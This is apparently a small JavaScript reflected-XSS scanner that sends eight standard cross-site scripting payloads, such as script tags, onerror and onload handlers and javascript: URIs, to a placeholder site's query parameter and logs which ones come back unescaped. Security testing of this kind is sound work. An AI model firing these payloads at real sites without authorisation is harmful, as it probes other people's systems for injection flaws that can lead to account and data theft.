// xss-scanner.js

const target = "https://TUWEB.com/?q=";

const payloads = [
"<script>alert(1)</script>",
"<img src=x onerror=alert(1)>",
"<svg/onload=alert(1)>",
"'><script>alert(1)</script>",
"javascript:alert(1)",
"<iframe src=javascript:alert(1)>",
"<body onload=alert(1)>",
"<input autofocus onfocus=alert(1)>"
];

async function scan(){

  for(const payload of payloads){

    const url = target + encodeURIComponent(payload);

    try{

      const res = await fetch(url);
      const text = await res.text();

      if(text.includes(payload)){
        console.log("❌ Possible XSS:", payload);
      }else{
        console.log("✅ Blocked:", payload);
      }

    }catch(err){
      console.log("Error:", err);
    }

  }

}

scan();
